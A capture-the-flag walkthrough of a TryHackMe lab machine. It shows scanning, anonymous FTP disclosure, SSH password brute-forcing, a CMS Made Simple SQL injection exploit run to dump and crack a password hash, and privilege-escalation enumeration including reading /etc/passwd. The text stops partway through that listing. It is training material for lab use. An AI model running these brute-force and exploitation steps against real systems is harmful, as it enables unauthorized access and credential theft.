# [simple-ctf](https://tryhackme.com/room/easyctf)

> A Linux machine serving FTP, HTTP, and SSH. The FTP server allows anonymous access and contains a text file that discloses a username and hints that its password is easily crackable. Brute-forcing SSH with the disclosed username and `rockyou.txt` yields a successful login. Alternatively, the web server is hosting the [CMS Made Simple](https://tryhackme.com/room/easyctf) application version 2.2.8, which is vulnerable to a SQL injection vulnerability, [CVE-2019-9053](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-9053). A [known exploit](https://www.exploit-db.com/exploits/46635) can be used to dump the CMS's user account database, which contains the user's password hash and salt. These can be cracked with `rockyou.txt` to reveal the user's password, which can be used to login via SSH. The user is capable of running `vim` as `root` without a password via `sudo`. This can leveraged to spawn a shell as `root`.

---

## Open Port Enumeration

### TCP

TCP ports 21, 80, and 2222 are open.

```bash
$ sudo masscan -p1-65535 10.10.162.248 --rate=1000 -e tun0 --output-format grepable --output-filename enum/simple-ctf.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-19 20:50:30 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat enum/simple-ctf.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
21,80,2222, 
```

The target is serving `vsftpd 3.0.3` on TCP port 21, an Apache web server on TCP port 80, and `OpenSSH 7.2p2` on port 2222.

```bash
$ sudo nmap -sC -sV -p21,2222,80 10.10.162.248 -oA enum/simple-ctf
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-19 21:15 UTC
Nmap scan report for ip-10-10-162-248.us-east-2.compute.internal (10.10.162.248)
Host is up (0.080s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.6.31.77
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.90 seconds
```

---

## FTP Enumeration

The target is hosting `vsftpd 3.0.3`, which is a relatively recent version of `vsftpd`.

It allows anonymous access and contains a single directory, `pub`, which contains a single file, `ForMitch.txt`.

```bash
$ ftp
ftp> open 10.10.162.248
Connected to 10.10.162.248.
220 (vsFTPd 3.0.3)
Name (10.10.162.248:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.00 secs (3.2981 MB/s)
```

`ForMitch.txt` is a note that shames a developer (presumably Mitch) for setting an easily crackable password.

```bash
$ cat ForMitch.txt
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

---

## SSH Brute-Forcing

`ForMitch.txt` hints that Mitch set a weak, easily-crackable password. Brute force it with `rockyou.txt`.

```bash
$ patator ssh_login host=10.10.162.248 port=2222 user=mitch password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed.'                                                                                130 ⨯
21:02:46 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.7 at 2022-01-19 21:02 UTC
21:02:48 patator    INFO -
21:02:48 patator    INFO - code  size    time | candidate                          |   num | mesg
21:02:48 patator    INFO - -----------------------------------------------------------------------------
21:02:57 patator    INFO - 0     39     0.179 | secret                             |    42 | SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
```

---

## Web Application Enumeration

The target's TCP port 80 is running a web application served by `Apache httpd 2.4.18`.

There is a `/robots.txt` file that indicates the target is running a [CUPS server](http://www.cups.org/) and disallows access to `/openemr-5_0_1_3`. However, the path results in a 404.

```txt
#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```

### Content Discovery

`/simple` is the only non-standard path.

```bash
$ gobuster dir -u http://10.10.162.248 -w /usr/share/wordlists/raft-small-words.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.162.248
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/01/19 21:23:29 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 292]
/.htm                 (Status: 403) [Size: 292]
/.htm.php             (Status: 403) [Size: 296]
/.html                (Status: 403) [Size: 293]
/.html.php            (Status: 403) [Size: 297]
/.                    (Status: 200) [Size: 11321]
/.htaccess            (Status: 403) [Size: 297]
/.htaccess.php        (Status: 403) [Size: 301]
/.phtml               (Status: 403) [Size: 294]
/.htc                 (Status: 403) [Size: 292]
/.htc.php             (Status: 403) [Size: 296]
/simple               (Status: 301) [Size: 315] [--> http://10.10.162.248/simple/]
/.html_var_DE         (Status: 403) [Size: 300]
/.html_var_DE.php     (Status: 403) [Size: 304]
/server-status        (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 297]
/.htpasswd.php        (Status: 403) [Size: 301]
/.html..php           (Status: 403) [Size: 298]
/.html.               (Status: 403) [Size: 294]
/.html.html           (Status: 403) [Size: 298]
/.html.html.php       (Status: 403) [Size: 302]
/.htpasswds           (Status: 403) [Size: 298]
/.htpasswds.php       (Status: 403) [Size: 302]
/.htm..php            (Status: 403) [Size: 297]
/.htm.                (Status: 403) [Size: 293]
/.htmll               (Status: 403) [Size: 294]
/.htmll.php           (Status: 403) [Size: 298]
/.phps                (Status: 403) [Size: 293]
/.html.old.php        (Status: 403) [Size: 301]
/.html.old            (Status: 403) [Size: 297]
/.ht                  (Status: 403) [Size: 291]
/.html.bak            (Status: 403) [Size: 297]
/.ht.php              (Status: 403) [Size: 295]
/.html.bak.php        (Status: 403) [Size: 301]
/.htm.htm             (Status: 403) [Size: 296]
/.htm.htm.php         (Status: 403) [Size: 300]
/.hta                 (Status: 403) [Size: 292]
/.htgroup             (Status: 403) [Size: 296]
/.html1               (Status: 403) [Size: 294]
/.hta.php             (Status: 403) [Size: 296]
/.html1.php           (Status: 403) [Size: 298]
/.htgroup.php         (Status: 403) [Size: 300]
/.html.LCK            (Status: 403) [Size: 297]
/.html.printable      (Status: 403) [Size: 303]
/.html.LCK.php        (Status: 403) [Size: 301]
/.html.printable.php  (Status: 403) [Size: 307]
/.htm.LCK             (Status: 403) [Size: 296]
/.htm.LCK.php         (Status: 403) [Size: 300]
/.htaccess.bak        (Status: 403) [Size: 301]
/.html.php            (Status: 403) [Size: 297]
/.htmls.php           (Status: 403) [Size: 298]
/.htx                 (Status: 403) [Size: 292]
/.html.php.php        (Status: 403) [Size: 301]
/.htaccess.bak.php    (Status: 403) [Size: 305]
/.htmls               (Status: 403) [Size: 294]
/.htx.php             (Status: 403) [Size: 296]
/.htlm                (Status: 403) [Size: 293]
/.htm2.php            (Status: 403) [Size: 297]
/.html-               (Status: 403) [Size: 294]
/.htuser              (Status: 403) [Size: 295]
/.htlm.php            (Status: 403) [Size: 297]
/.htm2                (Status: 403) [Size: 293]
/.html-.php           (Status: 403) [Size: 298]
/.htuser.php          (Status: 403) [Size: 299]

===============================================================
2022/01/19 21:35:05 Finished
===============================================================
```

### "CMS Made Simple" Enumeration

`/simple` is the home page of a [CMS Made Simple](http://www.cmsmadesimple.org/), instance, an open-source content management system.

![](images/Pasted%20image%2020220119214636.png)

---

## "CMS Made Simple" SQL Injection

The home page indicates that the "CMS Made Simple" version is 2.2.8.

"CMS Made Simple" has a significant SQL injection vulnerability in versions less than 2.2.10: [CVE-2019-9053](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-9053). A corresponding Python exploit can be found [here](https://www.exploit-db.com/exploits/46635). Use the exploit to dump the user account hashes. This results in a salt and password hash for `mitch`.

```bash
$ virtualenv -p python2.7 46635
$ source 46635/bin/activate
$ (46635) pip install termcolor
$ (46635) pip install requests
$ (46635) python 46635.py -u http://10.10.162.248/simple
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

According to the exploit, the MD5 hash is produced from the concatenation of the salt and the password, in that order.

```python
...[SNIP]...
if hashlib.md5(str(salt) + line).hexdigest() == password:
	output += "\n[+] Password cracked: " + line
	break
...[SNIP]...
```

This corresponds to the `hashcat` mode 20.

```bash
$ hashcat --example-hashes | grep -i MD5 -B 1 -A 1
...[SNIP]...
--
MODE: 20
TYPE: md5($salt.$pass)
HASH: 57ab8499d08c59a7211c77f557bf9425:4247
--
...[SNIP]...
```

After cracking the hash, the resultant password is `secret`.

```bash
$ hashcat -a 0 -m 20 '0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2' rockyou.txt
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
```

---

## SSH Access as `mitch`

Use the credential `mitch`:`secret` to access the target via SSH on port 2222 and grab the user flag from `/users/mitch/user.txt`.

```bash
$ ssh mitch@10.10.162.248 -p 2222
The authenticity of host '[10.10.162.248]:2222 ([10.10.162.248]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.162.248]:2222' (ECDSA) to the list of known hosts.
mitch@10.10.162.248's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
/usr/bin/xauth:  file /home/mitch/.Xauthority does not exist
$ id
uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)
```

---

## Privilege Escalation Enumeration as `mitch`

### Situational Awareness

#### Kernel and Distribution Versions

```bash
mitch@Machine:~$ uname -a
Linux Machine 4.15.0-58-generic #64~16.04.1-Ubuntu SMP Wed Aug 7 14:09:34 UTC 2019 i686 i686 i686 GNU/Linux

mitch@Machine:~$ cat /etc/issue
Ubuntu 16.04.6 LTS \n \l
```

#### CPU Characteristics
```bash
mitch@Machine:~$ lscpu
Architecture:          i686
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                1
On-line CPU(s) list:   0
Thread(s) per core:    1
Core(s) per socket:    1
Socket(s):             1
Vendor ID:             GenuineIntel
CPU family:            6
Model:                 63
Model name:            Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz
Stepping:              2
CPU MHz:               2399.989
BogoMIPS:              4800.00
Hypervisor vendor:     Xen
Virtualization type:   full
L1d cache:             32K
L1i cache:             32K
L2 cache:              256K
L3 cache:              30720K
Flags:                 fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht nx rdtscp lm constant_tsc xtopology cpuid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm cpuid_fault pti fsgsbase bmi1 avx2 smep bmi2 erms invpcid xsaveopt
```

#### Current Running Processes

```bash
mitch@Machine:~$ ps auxef
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    15:40   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [kworker/0:0H]
root         5  1.5  0.0      0     0 ?        I    15:40   0:06  \_ [kworker/u16:0]
root         6  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [mm_percpu_wq]
root         7  0.1  0.0      0     0 ?        S    15:40   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    15:40   0:00  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    15:40   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    15:40   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    15:40   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    15:40   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    15:40   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    15:40   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    15:40   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    15:40   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    15:40   0:00  \_ [xenwatch]
root        20  0.0  0.0      0     0 ?        S    15:40   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    15:40   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    15:40   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   15:40   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [crypto]
root        26  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [kintegrityd]
root        27  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [kblockd]
root        28  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [ata_sff]
root        29  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [md]
root        30  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [edac-poller]
root        31  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [devfreq_wq]
root        32  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [watchdogd]
root        35  0.1  0.0      0     0 ?        S    15:40   0:00  \_ [kswapd0]
root        36  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [kworker/u17:0]
root        37  0.0  0.0      0     0 ?        S    15:40   0:00  \_ [ecryptfs-kthrea]
root        79  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [kthrotld]
root        80  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [acpi_thermal_pm]
root        83  0.0  0.0      0     0 ?        S    15:40   0:00  \_ [scsi_eh_0]
root        84  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [scsi_tmf_0]
root        85  0.0  0.0      0     0 ?        S    15:40   0:00  \_ [scsi_eh_1]
root        86  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [scsi_tmf_1]
root        87  0.0  0.0      0     0 ?        I    15:40   0:00  \_ [kworker/u16:2]
root        88  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [ipv6_addrconf]
root        98  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [kstrp]
root       107  0.1  0.0      0     0 ?        I<   15:40   0:00  \_ [kworker/0:1H]
root       116  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I    15:40   0:00  \_ [kworker/0:2]
root       168  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [ttm_swap]
root       193  0.0  0.0      0     0 ?        S    15:40   0:00  \_ [jbd2/xvda1-8]
root       194  0.0  0.0      0     0 ?        I<   15:40   0:00  \_ [ext4-rsv-conver]
root       245  0.0  0.0      0     0 ?        I    15:40   0:00  \_ [kworker/0:3]
root       310  0.0  0.0      0     0 ?        I    15:40   0:00  \_ [kworker/u16:4]
root      1665  0.0  0.0      0     0 ?        I    15:46   0:00  \_ [kworker/u16:1]
root      1666  0.0  0.0      0     0 ?        I    15:46   0:00  \_ [kworker/u16:3]
root         1  5.5  1.1  24080  4824 ?        Ss   15:40   0:24 /sbin/init splash
root       232  0.6  0.6   5116  2620 ?        Ss   15:40   0:02 /lib/systemd/systemd-journald
root       258  0.6  0.5  14588  2244 ?        Ss   15:40   0:02 /lib/systemd/systemd-udevd
systemd+   433  0.0  0.5  12616  2284 ?        Ssl  15:40   0:00 /lib/systemd/systemd-timesyncd
message+   743  0.8  0.9   6508  4012 ?        Ss   15:41   0:03 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       765  0.0  0.0   6016     0 ?        Ss   15:41   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
syslog     771  0.1  0.5  30732  2404 ?        Ssl  15:41   0:00 /usr/sbin/rsyslogd -n
root       784  0.0  0.2   2248  1004 ?        Ss   15:41   0:00 /usr/sbin/acpid
root       791  0.1  1.3  39220  6012 ?        Ssl  15:41   0:00 /usr/lib/accountsservice/accounts-daemon
root       798  0.1  0.6   4152  2768 ?        Ss   15:41   0:00 /lib/systemd/systemd-logind
avahi      799  0.0  0.6   5932  2780 ?        Ss   15:41   0:00 avahi-daemon: running [Machine.local]
avahi      822  0.0  0.0   5932    52 ?        S    15:41   0:00  \_ avahi-daemon: chroot helper
root       803  0.0  0.6   7124  2788 ?        Ss   15:41   0:00 /usr/sbin/cron -f
root       804  0.2  2.0  91840  9084 ?        Ssl  15:41   0:00 /usr/sbin/NetworkManager --no-daemon
root       808  0.0  0.5   4560  2284 ?        Ss   15:41   0:00 /usr/sbin/anacron -dsq
root       947  0.3  1.6  37148  7212 ?        Ssl  15:41   0:01 /usr/lib/policykit-1/polkitd --no-debug
root       974  0.1  1.2  43412  5312 ?        Ssl  15:41   0:00 /usr/sbin/lightdm
root      1043  1.3  5.0 153220 21760 tty7     Ssl+ 15:41   0:04  \_ /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
root      1258  0.1  1.3  27916  5888 ?        Sl   15:42   0:00  \_ lightdm --session-child 16 19
lightdm   1277  0.0  0.1   2372   564 ?        Ss   15:42   0:00  |   \_ /bin/sh /usr/lib/lightdm/lightdm-greeter-session /usr/sbin/unity-greeter
lightdm   1296  2.9  6.8 370392 29788 ?        Sl   15:42   0:09  |       \_ /usr/sbin/unity-greeter
root      1334  0.0  1.0   9380  4564 ?        S    15:42   0:00  \_ lightdm --session-child 12 19
root      1023  0.3  2.1  36212  9240 ?        Ssl  15:41   0:01 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root      1042  0.0  0.3   5216  1312 ?        Ss   15:41   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root      1058  0.0  1.0  10012  4340 ?        Ss   15:41   0:00 /usr/sbin/sshd -D
root      1440  0.0  1.3  10676  5788 ?        Ss   15:45   0:00  \_ sshd: mitch [priv]
mitch     1495  0.0  0.7  10676  3052 ?        S    15:45   0:00      \_ sshd: mitch@pts/8
mitch     1496  0.0  0.3   2372  1460 pts/8    Ss   15:45   0:00          \_ -sh LANG=en_US.UTF-8 USER=mitch LOGNAME=mitch HOME=/home/mitch PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games MAI
mitch     1531  0.0  1.0   8380  4660 pts/8    S    15:46   0:00              \_ /bin/bash MAIL=/var/mail/mitch USER=mitch SSH_CLIENT=10.6.31.77 49594 2222 LC_TIME=ro_RO.UTF-8 HOME=/home/mitch SSH_TTY=/dev/pts/8 LC_MONETARY=ro_RO.UTF-8 Q
mitch     1759  0.0  0.8   9452  3584 pts/8    R+   15:47   0:00                  \_ ps auxef LC_PAPER=ro_RO.UTF-8 LC_ADDRESS=ro_RO.UTF-8 XDG_SESSION_ID=1 LC_MONETARY=ro_RO.UTF-8 SHELL=/bin/sh TERM=screen SSH_CLIENT=10.6.31.77 49594 2222
mysql     1060  0.9 22.4 535144 97000 ?        Ssl  15:41   0:03 /usr/sbin/mysqld
whoopsie  1093  0.0  1.8  38184  7940 ?        Ssl  15:41   0:00 /usr/bin/whoopsie -f
root      1095  0.0  0.1   2372   616 ?        Ss   15:41   0:00 /bin/sh /usr/lib/apt/apt.systemd.daily update
root      1112  0.0  0.3   2372  1528 ?        S    15:41   0:00  \_ /bin/sh /usr/lib/apt/apt.systemd.daily lock_is_held update
root      1289  0.0  1.3  12912  5892 ?        S    15:42   0:00      \_ apt-get -qq -y update
_apt      1292  0.0  1.2  12468  5520 ?        S    15:42   0:00          \_ /usr/lib/apt/methods/http
_apt      1293  0.0  1.1  12532  5184 ?        S    15:42   0:00          \_ /usr/lib/apt/methods/http
_apt      1294  0.0  1.2  12468  5520 ?        S    15:42   0:00          \_ /usr/lib/apt/methods/http
root      1116  0.0  0.4   6104  2128 ttyS0    Ss+  15:41   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1132  0.0  0.3   4752  1456 tty1     Ss+  15:41   0:00 /sbin/agetty --noclear tty1 linux
root      1217  0.2  3.5 239584 15328 ?        Ss   15:41   0:00 /usr/sbin/apache2 -k start
www-data  1225  0.0  1.4 239608  6132 ?        S    15:41   0:00  \_ /usr/sbin/apache2 -k start
www-data  1226  0.0  1.4 239608  6132 ?        S    15:41   0:00  \_ /usr/sbin/apache2 -k start
www-data  1227  0.0  1.4 239608  6128 ?        S    15:41   0:00  \_ /usr/sbin/apache2 -k start
www-data  1228  0.0  1.4 239608  6132 ?        S    15:41   0:00  \_ /usr/sbin/apache2 -k start
www-data  1229  0.0  1.4 239608  6132 ?        S    15:41   0:00  \_ /usr/sbin/apache2 -k start
lightdm   1261  0.1  0.9   6404  4124 ?        Ss   15:42   0:00 /lib/systemd/systemd --user
lightdm   1262  0.0  0.2  25096  1024 ?        S    15:42   0:00  \_ (sd-pam)
lightdm   1295  0.2  0.7   6164  3216 ?        Ss   15:42   0:00 /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --session
lightdm   1301  0.0  1.1  43448  5164 ?        Sl   15:42   0:00 /usr/lib/at-spi2-core/at-spi-bus-launcher --launch-immediately
lightdm   1306  0.0  0.7   5948  3328 ?        S    15:42   0:00  \_ /usr/bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3
lightdm   1308  0.0  1.0  29184  4368 ?        Sl   15:42   0:00 /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
lightdm   1314  0.0  1.2  39804  5556 ?        Sl   15:42   0:00 /usr/lib/gvfs/gvfsd
lightdm   1319  0.0  1.0  50696  4696 ?        Sl   15:42   0:00 /usr/lib/gvfs/gvfsd-fuse /run/user/108/gvfs -f -o big_writes
lightdm   1331  0.0  1.0  25276  4368 ?        Sl   15:42   0:00 /usr/lib/dconf/dconf-service
lightdm   1337  0.0  0.9   9692  4232 ?        S    15:42   0:00 upstart --user --startup-event indicator-services-start
lightdm   1342  0.1  1.5  48152  6684 ?        Ssl  15:42   0:00  \_ /usr/lib/i386-linux-gnu/indicator-messages/indicator-messages-service
lightdm   1343  0.0  1.1  53796  5124 ?        Ssl  15:42   0:00  \_ /usr/lib/i386-linux-gnu/indicator-bluetooth/indicator-bluetooth-service
lightdm   1344  0.1  1.6  72688  7076 ?        Ssl  15:42   0:00  \_ /usr/lib/i386-linux-gnu/indicator-power/indicator-power-service
lightdm   1345  0.1  2.3 100256 10180 ?        Ssl  15:42   0:00  \_ /usr/lib/i386-linux-gnu/indicator-datetime/indicator-datetime-service
lightdm   1346  1.6  4.8 105300 20868 ?        Ssl  15:42   0:05  \_ /usr/lib/i386-linux-gnu/indicator-keyboard/indicator-keyboard-service --use-gtk
lightdm   1347  0.2  2.0 315336  8792 ?        Ssl  15:42   0:00  \_ /usr/lib/i386-linux-gnu/indicator-sound/indicator-sound-service
lightdm   1348  0.1  1.4  70924  6116 ?        Ssl  15:42   0:00  \_ /usr/lib/i386-linux-gnu/indicator-session/indicator-session-service
lightdm   1370  0.0  2.0  58008  8804 ?        Ssl  15:42   0:00  \_ /usr/lib/i386-linux-gnu/indicator-application/indicator-application-service
lightdm   1395  0.0  1.5 156556  6580 ?        S<l  15:42   0:00  \_ /usr/bin/pulseaudio --start --log-target=syslog
lightdm   1339  1.1  4.9 111472 21576 ?        Sl   15:42   0:03 nm-applet
lightdm   1362  0.8  3.9  82868 16960 ?        Sl   15:42   0:02 /usr/lib/unity-settings-daemon/unity-settings-daemon
rtkit     1397  0.0  0.6  23800  2952 ?        SNsl 15:42   0:00 /usr/lib/rtkit/rtkit-daemon
root      1413  0.1  1.7  73004  7476 ?        Ssl  15:42   0:00 /usr/lib/upower/upowerd
colord    1426  0.5  2.3  43268 10108 ?        Ssl  15:42   0:01 /usr/lib/colord/colord
mitch     1442  0.0  0.9   6404  4244 ?        Ss   15:45   0:00 /lib/systemd/systemd --user LANG=en_US.UTF-8 LC_ADDRESS=ro_RO.UTF-8 LC_IDENTIFICATION=ro_RO.UTF-8 LC_MEASUREMENT=ro_RO.UTF-8 LC_MONETARY=ro_RO.UTF-8 LC_NAME=ro_RO.UTF-8 LC_
mitch     1443  0.0  0.2  25096  1120 ?        S    15:45   0:00  \_ (sd-pam)
root      1667  0.0  1.5  15740  6872 ?        Ss   15:46   0:00 /usr/sbin/cupsd -l
root      1668  0.0  2.1  37580  9092 ?        Ssl  15:46   0:00 /usr/sbin/cups-browsed
```

#### Current User

```bash
mitch@Machine:~$ id
uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)
```

#### Current User's Allowed `sudo` Commands

`mitch` is capable of running `vim` as `root` with no password via `sudo`.

```bash
mitch@Machine:~$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

#### Current User's Execution History

The execution history makes the intended privilege escalation path clear. `mitch` checks his allowed `sudo` commands with `sudo -l`. He then runs `vim`, `id`, and `cd`'s into `/root`. This indicates that `sudo` shell escape through `vim` is the intended privilege escalation path.

```bash
mitch@Machine:~$ cat ~/.bash_history
ls
clear
exit
ls -la
id
clear
sudo -l
clear
vim
/usr/bin/vim
id
cd /root
cd
clear
ls -la
rm -rf examples.desktop
touch user.txt
echo G00d j0b, keep up! > user.txt
/usr/bin/vim
exit
```

#### Users

`/home/sunbath` is the only non-standard user account.

```bash
mitch@Machine:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
